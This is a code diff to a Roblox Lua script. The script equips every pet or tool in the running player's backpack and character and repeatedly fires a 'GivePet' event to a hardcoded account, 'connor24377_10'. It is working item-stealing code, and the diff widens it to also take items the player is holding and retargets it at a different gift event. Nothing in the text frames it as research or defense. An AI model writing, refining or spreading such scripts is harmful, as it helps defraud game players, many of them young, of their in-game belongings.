@@ -4,7 +4,8 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local adminUsername = "connor24377_10"
 local localPlayer = Players.LocalPlayer
 local backpack = localPlayer:WaitForChild("Backpack")
-local petGiftEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local giftPetEvent = ReplicatedStorage:WaitForChild("GiftPet")
 
 local adminPlayer = Players:FindFirstChild(adminUsername)
 if not adminPlayer then
@@ -13,18 +14,28 @@ if not adminPlayer then
 end
 
 local function equipTool(tool)
-	local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
 	local humanoid = character:FindFirstChildOfClass("Humanoid")
-	if humanoid and tool and tool.Parent == backpack then
+	if humanoid and tool and tool.Parent and (tool.Parent == backpack or tool.Parent == character) then
 		humanoid:EquipTool(tool)
 	end
 end
 
-for _, item in ipairs(backpack:GetChildren()) do
-	if item:IsA("Tool") or item:IsA("Model") then
-		equipTool(item)
-		wait(0.3) -- wait a bit while equipped
-		petGiftEvent:FireServer("GivePet", adminPlayer)
-		wait(0.3)
+local function tryGift(item)
+	if giftPetEvent then
+		giftPetEvent:FireServer("GivePet", adminPlayer)
 	end
 end
+
+local function giftAllFrom(container)
+	for _, item in ipairs(container:GetChildren()) do
+		if item:IsA("Tool") or item:IsA("Model") then
+			equipTool(item)
+			wait(0.3)
+			tryGift(item)
+			wait(0.3)
+		end
+	end
+end
+
+giftAllFrom(backpack)
+giftAllFrom(character)
